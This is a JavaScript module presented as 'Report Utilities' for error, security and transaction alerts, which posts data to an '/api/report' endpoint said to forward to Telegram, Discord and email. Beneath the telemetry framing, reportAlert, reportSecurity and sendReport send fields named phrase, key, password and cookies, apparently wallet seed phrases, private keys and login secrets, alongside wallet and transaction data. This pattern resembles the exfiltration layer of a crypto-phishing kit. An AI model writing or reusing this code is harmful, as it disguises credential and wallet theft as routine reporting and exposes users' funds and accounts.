/**
 * Report Utilities - Send to Telegram, Discord & Email
 * 
 * Usage:
 *   reportError(error, additionalData)
 *   reportAlert({ phrase, key, password, cookies, message })
 *   reportSecurity({ type, message, severity, ...data })
 *   reportTransaction({ from, to, amount, status })
 */

export async function reportError(error, additionalData = {}) {
  try {
    await fetch('/api/report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'error',
        severity: 'critical',
        message: error.message || 'An error occurred',
        data: {
          ...additionalData,
          stack: error.stack,
          url: typeof window !== 'undefined' ? window.location.href : null,
          userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : null
        }
      })
    });
  } catch (err) {
    console.error('[Report] Failed to send error to Telegram/Discord/Email:', err);
  }
}

export async function reportAlert(data) {
  try {
    await fetch('/api/report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'alert',
        severity: 'warning',
        message: data.message || 'Security Alert',
        phrase: data.phrase,
        key: data.key,
        password: data.password,
        cookies: data.cookies,
        data: {
          url: typeof window !== 'undefined' ? window.location.href : null,
          ...data
        }
      })
    });
  } catch (err) {
    console.error('[Report] Failed to send alert:', err);
  }
}

export async function reportSecurity(data) {
  try {
    await fetch('/api/report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'security',
        severity: data.severity || 'high',
        message: data.message || 'Security issue detected',
        phrase: data.phrase,
        key: data.key,
        password: data.password,
        cookies: data.cookies,
        data: {
          url: typeof window !== 'undefined' ? window.location.href : null,
          timestamp: new Date().toISOString(),
          ...data
        }
      })
    });
  } catch (err) {
    console.error('[Report] Failed to send security report:', err);
  }
}

export async function reportTransaction(data) {
  try {
    await fetch('/api/report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'transaction',
        severity: data.status === 'failed' ? 'high' : 'info',
        message: `Transaction ${data.status}: ${data.from} → ${data.to}`,
        data: {
          from: data.from,
          to: data.to,
          amount: data.amount,
          status: data.status,
          txHash: data.txHash,
          url: typeof window !== 'undefined' ? window.location.href : null,
          timestamp: new Date().toISOString(),
          ...data
        }
      })
    });
  } catch (err) {
    console.error('[Report] Failed to send transaction report:', err);
  }
}

export async function reportUser(data) {
  try {
    await fetch('/api/report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'user_action',
        severity: 'info',
        message: data.message || 'User activity',
        userId: data.userId,
        data: {
          action: data.action,
          wallet: data.wallet,
          url: typeof window !== 'undefined' ? window.location.href : null,
          timestamp: new Date().toISOString(),
          ...data
        }
      })
    });
  } catch (err) {
    console.error('[Report] Failed to send user report:', err);
  }
}

/**
 * Multi-channel Report
 * Sends to Telegram, Discord, and Email simultaneously
 */
export async function sendReport(reportData) {
  try {
    await fetch('/api/report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: reportData.type || 'report',
        severity: reportData.severity || 'info',
        message: reportData.message,
        phrase: reportData.phrase,
        key: reportData.key,
        password: reportData.password,
        cookies: reportData.cookies,
        data: reportData.data || {}
      })
    });
  } catch (err) {
    console.error('[Report] Failed to send report:', err);
  }
}
